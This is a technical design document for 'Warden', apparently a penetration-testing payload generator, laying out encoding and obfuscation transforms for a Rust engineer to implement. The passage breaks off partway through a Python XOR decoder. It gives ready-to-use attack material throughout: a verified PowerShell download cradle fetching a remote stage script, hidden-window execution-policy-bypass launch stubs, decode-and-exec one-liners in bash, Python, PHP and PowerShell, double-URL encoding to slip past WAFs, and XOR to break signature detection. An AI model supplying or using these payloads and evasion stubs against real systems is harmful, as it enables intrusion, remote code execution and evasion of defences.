# Warden — Encoding & Obfuscation Layer Research

Scope: publicly documented pentest-curriculum encoding/obfuscation transforms and
delivery/staging mechanics for the payload generator. **Out of scope** (do not
implement in this layer): memory-injection primitives, direct syscall stubs, EDR
unhooking, process hollowing.

This document is written so a Rust engineer can implement each transform directly.
Every example uses `{placeholder}` slots. Command syntax was verified on the host
where noted.

---

## 0. Design notes for the Rust layer

Model each transform as a pure function `Vec<u8> -> Vec<u8>` (bytes in, bytes out)
plus a `stub(target_lang) -> String` that emits the decode/exec wrapper. Chain
transforms as an ordered pipeline; the emitted stub must reverse them in inverse
order. Keep the RNG seedable so payloads are reproducible for lab write-ups.

Key crates: `base64`, `flate2` (gzip/deflate), `hex`, `rand`, `percent-encoding`.

Recommended internal type:

```
enum Transform {
    Base64,
    Utf16LeBase64,     // PowerShell -EncodedCommand
    Hex,
    UrlEncode { double: bool },
    Xor { key: Vec<u8> },
    GzipBase64,
    CharCodeArray { lang: Lang },
}
```

---

## 1. Encoding transforms

### 1.1 PowerShell `-EncodedCommand` (UTF-16LE + Base64)

**What it does.** `powershell.exe -EncodedCommand <b64>` takes a Base64 string that
decodes to the **UTF-16LE (little-endian, no BOM)** byte representation of a
PowerShell script, then runs it. Solves quoting/escaping problems in one-liners and
is the single most common PowerShell delivery form.

**Why people get it wrong.** .NET strings are UTF-16LE internally, so PowerShell
expects each ASCII char as **two bytes: the ASCII byte then `0x00`**. Encoding UTF-8
(one byte per char) produces a string that Base64-decodes but fails to parse. No BOM
should be prepended.

**Exact algorithm.**
1. Take the script text as UTF-8/ASCII.
2. Re-encode to UTF-16LE: for each code unit emit low byte then high byte. For ASCII
   `X` this is `[X, 0x00]`. (`whoami` → `77 00 68 00 6F 00 61 00 6D 00 69 00`.)
3. Do **not** prepend a BOM (`FF FE`).
4. Base64-encode the resulting byte buffer (standard alphabet, `=` padding).

**Produce it from Linux (verified on this host):**

```bash
printf %s '{powershell_command}' | iconv -f UTF-8 -t UTF-16LE | base64 -w0
```

- `printf %s` avoids the trailing newline `echo` adds (a stray newline is harmless
  but changes the Base64).
- `iconv -t UTF-16LE` (not `UTF-16`, which adds a BOM) does the byte-order expansion.
- `base64 -w0` disables line wrapping — **required**, wrapped Base64 breaks the flag.

Verified output:

```
printf %s 'whoami' | iconv -f UTF-8 -t UTF-16LE | base64 -w0
=> dwBoAG8AYQBtAGkA
```

Full download-cradle example (verified):

```
printf %s 'IEX(New-Object Net.WebClient).DownloadString("http://{lhost}/{stage}.ps1")' \
  | iconv -f UTF-8 -t UTF-16LE | base64 -w0
=> SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADUALwBzAC4AcABzADEAIgApAA==
```
(placeholders were `{lhost}=10.10.14.5`, `{stage}=s`.)

**Rust implementation:**

```rust
fn ps_encodedcommand(script: &str) -> String {
    let mut buf = Vec::with_capacity(script.len() * 2);
    for u in script.encode_utf16() {          // UTF-16 code units
        buf.extend_from_slice(&u.to_le_bytes()); // little-endian
    }
    base64::engine::general_purpose::STANDARD.encode(buf)
}
```

**Target-side exec stub:**

```powershell
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64}
```

`-EncodedCommand` can be abbreviated `-enc` / `-e`. Common companions: `-NoProfile`
(`-NoP`), `-NonInteractive`, `-WindowStyle Hidden` (`-W Hidden`), `-ExecutionPolicy
Bypass` (execution policy is not a security boundary — `-Exec Bypass` sidesteps it).

---

### 1.2 Plain Base64 for bash / python / php

**What it does.** Standard Base64 (RFC 4648, UTF-8 bytes). Hides literal strings from
naive greps and lets you pass a payload through single-argument channels. Note: this
is **encoding, not encryption** — trivially reversible and fully signatured.

**Encode (Linux):**

```bash
printf %s '{command}' | base64 -w0
```

**Target-side decode-and-exec stubs:**

Bash:
```bash
echo {b64} | base64 -d | bash
# or avoid a temp/pipe visibility:
bash -c "$(echo {b64} | base64 -d)"
```

Python 3:
```python
import base64; exec(base64.b64decode("{b64}").decode())
```
One-liner form:
```bash
python3 -c 'import base64;exec(base64.b64decode("{b64}"))'
```

PHP:
```php
<?php eval(base64_decode("{b64}")); ?>
```
CLI:
```bash
php -r 'eval(base64_decode("{b64}"));'
```

**Rust:** `base64::engine::general_purpose::STANDARD.encode(bytes)`.
For URL-safe channels use the `URL_SAFE` engine (`-`/`_` instead of `+`/`/`).

---

### 1.3 Hex encoding

**What it does.** Each byte → two lowercase hex chars. Used where Base64's `+/=`
would break parsing, and for shellcode literals (`\x41\x42...`).

**Encode (Linux):**

```bash
printf %s '{command}' | xxd -p | tr -d '\n'     # continuous hex
```

**Target-side stubs:**

Bash:
```bash
echo {hex} | xxd -r -p | bash
```

Python 3:
```python
exec(bytes.fromhex("{hex}").decode())
```

PowerShell (hex string → bytes → text):
```powershell
$h="{hex}"; $b=[byte[]]::new($h.Length/2)
for($i=0;$i -lt $h.Length;$i+=2){$b[$i/2]=[Convert]::ToByte($h.Substring($i,2),16)}
IEX([Text.Encoding]::ASCII.GetString($b))
```

C (shellcode literal form): emit `"\x41\x42..."` for a `char buf[]`.

**Rust:** `hex::encode(bytes)`. For `\xNN` literal form:
`bytes.iter().map(|b| format!("\\x{:02x}", b)).collect::<String>()`.

---

### 1.4 URL encoding and double-URL encoding

**What it does.** Percent-encoding (`%NN`). Primary use is web payload delivery
through input filters/WAFs. **Double-encoding** (`%` → `%25`, so space → `%2520`)
defeats filters that decode once then inspect, but pass the raw string to a component
that decodes a second time.

**Single encode:** reserved/unsafe byte `0xNN` → `%NN` (uppercase hex conventional).
Space → `%20`, `/` → `%2F`, `<` → `%3C`, `'` → `%27`.

**Double encode:** URL-encode the already-encoded string. `%` itself becomes `%25`.
- `../` → single `%2e%2e%2f` → double `%252e%252e%252f`
- `<script>` → single `%3Cscript%3E` → double `%253Cscript%253E`

**Linux quick check:**
```bash
python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' '{payload}'
# double:
python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(urllib.parse.quote(sys.argv[1],safe=""),safe=""))' '{payload}'
```

**Rust:** use `percent_encoding` with a strict set
(`percent_encoding::NON_ALPHANUMERIC`). For double, run the encoder twice.

```rust
use percent_encoding::{utf8_percent_encode, NON_ALPHANUMERIC};
fn urlenc(s: &str) -> String { utf8_percent_encode(s, NON_ALPHANUMERIC).to_string() }
fn urlenc2(s: &str) -> String { urlenc(&urlenc(s)) }
```

**Target side:** none — the target's URL parser / web server performs the decode.
Deliver the encoded string in the request path/query/body.

---

### 1.5 XOR (single-byte and multi-byte key)

**What it does.** `out[i] = in[i] XOR key[i % keylen]`. Cheap reversible cipher that
breaks static string signatures. **Not** a real cipher (single-byte keys fall to
frequency analysis; keys travel with the payload). Its value is defeating naive
signature matching, nothing more.

**Algorithm (same for encode and decode — XOR is symmetric):**
```
for i in 0..len: out[i] = data[i] ^ key[i % key.len()]
```
Single-byte key = special case `key.len() == 1`.

**Rust:**
```rust
fn xor(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter().enumerate().map(|(i,b)| b ^ key[i % key.len()]).collect()
}
```
Emit the XOR'd bytes to the stub as Base64 or a `\xNN`/`0xNN` array so they survive
transport. Avoid key bytes that reintroduce badchars into the encoded output.

**Decoder stubs** (assume XOR'd payload arrives Base64'd, key known to stub):

PowerShell (multi-byte key):
```powershell
$k=[byte[]]({key_csv})                       # e.g. 0x41,0x42,0x43
$e=[Convert]::FromBase64String("{b64_xored}")
$d=for($i=0;$i -lt $e.Length;$i++){$e[$i] -bxor $k[$i % $k.Length]}
IEX([Text.Encoding]::ASCII.GetString([byte[]]$d))
```

Python 3:
```python
import base64
k=bytes({key_list})                          # e.g. b"ABC"
e=base64.b64decode("{b64_xored}")
d=bytes(c ^ k[i % len(k)] for i,c in enumerate(e))